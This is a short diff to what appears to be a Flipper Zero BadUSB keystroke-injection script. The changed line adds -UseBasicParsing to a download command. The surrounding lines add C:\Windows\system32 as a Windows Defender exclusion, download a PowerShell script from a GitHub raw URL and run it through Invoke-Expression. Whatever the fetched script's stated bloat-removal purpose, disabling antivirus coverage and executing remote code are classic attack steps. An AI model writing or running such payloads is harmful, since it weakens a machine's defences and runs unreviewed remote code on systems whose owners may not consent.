@@ -27,7 +27,7 @@ DELAY 500
 STRING Add-MpPreference -ExclusionPath C:\Windows\system32
 ENTER
 DELAY 750
-STRING $ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/MFisher14/FlipperZero/main/BadUSB/RemoveBloat.ps1
+STRING $ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/MFisher14/FlipperZero/main/BadUSB/RemoveBloat.ps1 -UseBasicParsing
 ENTER
 DELAY 5000
 STRING Invoke-Expression $($ScriptFromGitHub.Content)
